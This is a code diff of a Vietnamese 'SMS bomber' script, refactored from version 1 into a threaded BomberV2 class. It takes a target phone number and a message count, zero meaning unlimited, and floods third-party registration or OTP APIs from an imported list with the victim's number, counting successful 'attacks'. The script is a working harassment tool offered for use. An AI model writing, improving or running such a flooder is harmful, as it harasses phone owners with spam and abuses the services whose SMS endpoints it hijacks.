@@ -1,160 +1,160 @@
-# -*- coding: utf-8 -*-
 import requests
 import time
 import os
 import threading
+import itertools
 from colorama import Fore, Style, init
-from apis import API_LIST  # Import danh sách API từ file apis.py
 
-# Khởi tạo colorama
+from apis import API_LIST
+
 init(autoreset=True)
 
-# Banner và thông tin
-def banner():
-    """Hiển thị banner và thông tin của tool."""
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print(Fore.CYAN + Style.BRIGHT + r"""
-██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗
-██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
-██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
-██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
-██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║███████╗██║  ██║
-╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
-    """)
-    print(Fore.YELLOW + Style.BRIGHT + "═════════════════════════════════════════════════════")
-    print(Fore.GREEN + Style.BRIGHT + "            TOOL SPAM SMS - BOMBER V1 BY SIGMA")
-    print(Fore.YELLOW + Style.BRIGHT + "═════════════════════════════════════════════════════")
-    print(Fore.RED + "Author: Sigma")
-    print(Fore.RED + "Version: 1.0 (2025)")
-    print(Fore.RED + "GitHub: (Cập nhật link GitHub của bạn ở đây)")
-    print(Fore.YELLOW + Style.BRIGHT + "═════════════════════════════════════════════════════")
-    print(Fore.WHITE + "Lưu ý: Tool chỉ dùng cho mục đích thử nghiệm, không lạm dụng.")
-    print(Fore.YELLOW + Style.BRIGHT + "═════════════════════════════════════════════════════\n")
+class BomberV2:
+    def __init__(self):
+        self.phone_number = ""
+        self.num_messages = 0
+        self.success_count = 0
+        self.failure_count = 0
+        self.stop_event = threading.Event()
+        self.lock = threading.Lock()
 
-# Hàm gửi tin nhắn từ một API cụ thể
-def send_request(phone_number, api_config):
-    """Gửi một yêu cầu spam đến một API."""
-    try:
-        # Thay thế placeholder {phone} bằng số điện thoại
-        api_config['url'] = api_config['url'].replace('{phone}', phone_number)
-        if 'data' in api_config:
-            for key, value in api_config['data'].items():
-                if isinstance(value, str):
-                    api_config['data'][key] = value.replace('{phone}', phone_number)
-        if 'json' in api_config:
-             for key, value in api_config['json'].items():
-                if isinstance(value, str):
-                    api_config['json'][key] = value.replace('{phone}', phone_number)
+    def display_banner(self):
+        os.system('cls' if os.name == 'nt' else 'clear')
+        banner_art = r"""
+██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗      ██╗   ██╗
+██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗     ██║   ██║
+██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝     ██║   ██║
+██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗     ╚██╗ ██╔╝
+██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║███████╗██║  ██║      ╚████╔╝
+╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝       ╚═══╝
+        """
+        print(Fore.CYAN + Style.BRIGHT + banner_art)
+        print(Fore.YELLOW + Style.BRIGHT + "═════════════════════════════════════════════════════════════════════")
+        print(Fore.GREEN + Style.BRIGHT + "                  TOOL SPAM SMS - BOMBER V2 BY SIGMA")
+        print(Fore.YELLOW + Style.BRIGHT + "═════════════════════════════════════════════════════════════════════")
+        print(f"{Fore.RED}Author: Sigma")
+        print(f"{Fore.RED}Version: 2.0 (2025)")
+        print(f"{Fore.RED}GitHub: https://github.com/Hunoka07/Bomber.git")
+        print(Fore.YELLOW + Style.BRIGHT + "═════════════════════════════════════════════════════════════════════\n")
 
-        method = api_config.get('method', 'POST').upper()
-        
-        if method == 'POST':
-            response = requests.post(
-                api_config['url'],
-                data=api_config.get('data'),
-                json=api_config.get('json'),
-                headers=api_config.get('headers'),
-                timeout=10
-            )
-        elif method == 'GET':
-             response = requests.get(
-                api_config['url'],
-                params=api_config.get('params'),
-                headers=api_config.get('headers'),
-                timeout=10
-            )
-        else:
-            print(f"{Fore.RED}[-] Phương thức {method} không được hỗ trợ.")
-            return
-
-        if response.status_code in [200, 201, 204]:
-            print(f"{Fore.GREEN}[+] Gửi thành công từ {api_config['name']} tới {phone_number}")
-        else:
-            print(f"{Fore.YELLOW}[-] Gửi thất bại từ {api_config['name']} | Status: {response.status_code}")
-
-    except requests.exceptions.RequestException as e:
-        print(f"{Fore.RED}[!] Lỗi kết nối: {e}")
-    except Exception as e:
-        print(f"{Fore.RED}[!] Lỗi không xác định: {e}")
-
-# Hàm chính điều khiển việc spam
-def start_spamming(phone_number, num_messages):
-    """Bắt đầu quá trình spam SMS."""
-    threads = []
-    message_count = 0
-    
-    print(f"\n{Fore.CYAN}[*] Bắt đầu quá trình spam tới số: {phone_number}")
-    if num_messages == 0:
-        print(f"{Fore.CYAN}[*] Chế độ: Vô hạn (Nhấn Ctrl+C để dừng)")
-    else:
-        print(f"{Fore.CYAN}[*] Số lượng tin nhắn cần gửi: {num_messages}")
-    print(Fore.YELLOW + "----------------------------------------------------")
-    
-    try:
-        if num_messages == 0:
-            while True:
-                for api in API_LIST:
-                    thread = threading.Thread(target=send_request, args=(phone_number, api.copy()))
-                    threads.append(thread)
-                    thread.start()
-                    time.sleep(0.1) # Giảm độ trễ giữa các request
-                
-                for t in threads:
-                    t.join() # Chờ tất cả các thread hoàn thành chu kỳ hiện tại
-                threads = [] # Xóa danh sách thread cũ
-                message_count += len(API_LIST)
-                print(f"\n{Fore.BLUE}Đã hoàn thành một lượt gửi. Tổng số: {message_count}. Bắt đầu lượt mới...\n")
-
-        else:
-            for i in range(num_messages):
-                api = API_LIST[i % len(API_LIST)] # Lặp lại danh sách API
-                thread = threading.Thread(target=send_request, args=(phone_number, api.copy()))
-                threads.append(thread)
-                thread.start()
-                time.sleep(0.2) # Thêm độ trễ để tránh quá tải
-                
-                # Dọn dẹp các thread đã hoàn thành để tránh quá tải bộ nhớ
-                threads = [t for t in threads if t.is_alive()]
-            
-            # Chờ các thread cuối cùng hoàn thành
-            for t in threads:
-                t.join()
-
-    except KeyboardInterrupt:
-        print(f"\n\n{Fore.RED}[!] Đã dừng bởi người dùng. Đang chờ các tác vụ cuối cùng hoàn tất...")
-        # Không cần join() ở đây vì vòng lặp đã bị ngắt
-    finally:
-        print(f"\n{Fore.GREEN}════════════════════════════════════════════════")
-        print(f"{Fore.GREEN}            HOÀN THÀNH TÁC VỤ SPAM!")
-        print(f"{Fore.GREEN}════════════════════════════════════════════════\n")
-
-
-# Hàm chính của chương trình
-def main():
-    """Hàm main để chạy tool."""
-    banner()
-    while True:
-        phone_number = input(f"{Fore.YELLOW}➤ Nhập số điện thoại cần spam (ví dụ: 0987654321): {Style.RESET_ALL}").strip()
-        if phone_number.isdigit() and len(phone_number) >= 9 and len(phone_number) <= 11:
-            # Chuẩn hóa số điện thoại về dạng không có số 0 ở đầu nếu cần
-            if phone_number.startswith('0'):
-                phone_number = phone_number[1:]
-            break
-        else:
-            print(f"{Fore.RED}[!] Số điện thoại không hợp lệ. Vui lòng nhập lại.")
-
-    while True:
-        try:
-            num_messages_str = input(f"{Fore.YELLOW}➤ Nhập số lượng tin nhắn (nhập 0 để spam vô hạn): {Style.RESET_ALL}").strip()
-            num_messages = int(num_messages_str)
-            if num_messages >= 0:
+    def get_user_input(self):
+        while True:
+            phone_input = input(f"{Fore.YELLOW}➤ Nhập SĐT (ví dụ: 0987654321): {Style.RESET_ALL}").strip()
+            if phone_input.isdigit() and 9 <= len(phone_input) <= 11:
+                self.phone_number = phone_input[1:] if phone_input.startswith('0') else phone_input
                 break
             else:
-                print(f"{Fore.RED}[!] Vui lòng nhập một số không âm.")
-        except ValueError:
-            print(f"{Fore.RED}[!] Đây không phải là một số hợp lệ. Vui lòng nhập lại.")
+                print(f"{Fore.RED}[!] Số điện thoại không hợp lệ. Vui lòng nhập lại.")
 
-    start_spamming(phone_number, num_messages)
+        while True:
+            try:
+                num_input = input(f"{Fore.YELLOW}➤ Số lượng tin nhắn (0 = vô hạn): {Style.RESET_ALL}").strip()
+                self.num_messages = int(num_input)
+                if self.num_messages >= 0:
+                    break
+                else:
+                    print(f"{Fore.RED}[!] Vui lòng nhập một số không âm.")
+            except ValueError:
+                print(f"{Fore.RED}[!] Đây không phải là một số hợp lệ. Vui lòng nhập lại.")
+
+    def send_request(self, api_config):
+        try:
+            api = api_config.copy()
+            url = api['url'].format(phone=self.phone_number, phone_zero=f"0{self.phone_number}")
+            method = api.get('method', 'POST').upper()
+            
+            data = api.get('data')
+            if data:
+                data = {k: str(v).format(phone=self.phone_number, phone_zero=f"0{self.phone_number}") for k, v in data.items()}
+
+            json_payload = api.get('json')
+            if json_payload:
+                json_payload = {k: str(v).format(phone=self.phone_number, phone_zero=f"0{self.phone_number}") for k, v in json_payload.items()}
+
+            headers = api.get('headers', {"User-Agent": "Mozilla/5.0"})
+
+            if method == 'POST':
+                response = requests.post(url, data=data, json=json_payload, headers=headers, timeout=10)
+            elif method == 'GET':
+                response = requests.get(url, params=data, headers=headers, timeout=10)
+            else:
+                with self.lock:
+                    self.failure_count += 1
+                return
+
+            if response.status_code < 300:
+                with self.lock:
+                    self.success_count += 1
+            else:
+                with self.lock:
+                    self.failure_count += 1
+        except Exception:
+            with self.lock:
+                self.failure_count += 1
+
+    def display_status(self):
+        spinner = itertools.cycle(['-', '/', '|', '\\'])
+        while not self.stop_event.is_set():
+            total = self.success_count + self.failure_count
+            mode = "Vô hạn" if self.num_messages == 0 else f"{total}/{self.num_messages}"
+            
+            status_line = (
+                f"\r{Fore.CYAN}[{next(spinner)}] Đang tấn công SĐT: {self.phone_number} | "
+                f"{Fore.WHITE}Chế độ: {mode} | "
+                f"{Fore.GREEN}Thành công: {self.success_count} | "
+                f"{Fore.RED}Thất bại: {self.failure_count} "
+            )
+            print(status_line, end="")
+            time.sleep(0.1)
+
+    def start_spamming(self):
+        self.display_banner()
+        self.get_user_input()
+        
+        print(Fore.YELLOW + "\n" + "─" * 70)
+        print(f"{Fore.CYAN}            [*] Bắt đầu tấn công. Nhấn Ctrl+C để dừng. [*]")
+        print(Fore.YELLOW + "─" * 70 + "\n")
+
+        status_thread = threading.Thread(target=self.display_status)
+        status_thread.start()
+
+        threads = []
+        try:
+            if self.num_messages == 0:
+                api_cycle = itertools.cycle(API_LIST)
+                while not self.stop_event.is_set():
+                    api = next(api_cycle)
+                    thread = threading.Thread(target=self.send_request, args=(api,))
+                    thread.start()
+                    threads.append(thread)
+                    time.sleep(0.05)
+                    threads = [t for t in threads if t.is_alive()]
+            else:
+                for i in range(self.num_messages):
+                    if self.stop_event.is_set():
+                        break
+                    api = API_LIST[i % len(API_LIST)]
+                    thread = threading.Thread(target=self.send_request, args=(api,))
+                    thread.start()
+                    threads.append(thread)
+                    time.sleep(0.05)
+                    if len(threads) >= 20:
+                        for t in threads:
+                            t.join(timeout=5)
+                        threads = [t for t in threads if t.is_alive()]
+
+        except KeyboardInterrupt:
+            print(f"\n\n{Fore.RED}[!] Đã nhận lệnh dừng từ người dùng...")
+        finally:
+            self.stop_event.set()
+            status_thread.join()
+            
+            print("\n" + Fore.YELLOW + "─" * 70)
+            print(f"{Fore.GREEN}            [*] HOÀN THÀNH TÁC VỤ SPAM! [*]")
+            print(f"{Fore.GREEN}Tổng thành công: {self.success_count}")
+            print(f"{Fore.RED}Tổng thất bại: {self.failure_count}")
+            print(Fore.YELLOW + "─" * 70 + "\n")
 
 if __name__ == "__main__":
-    main()
+    bomber = BomberV2()
+    bomber.start_spamming()
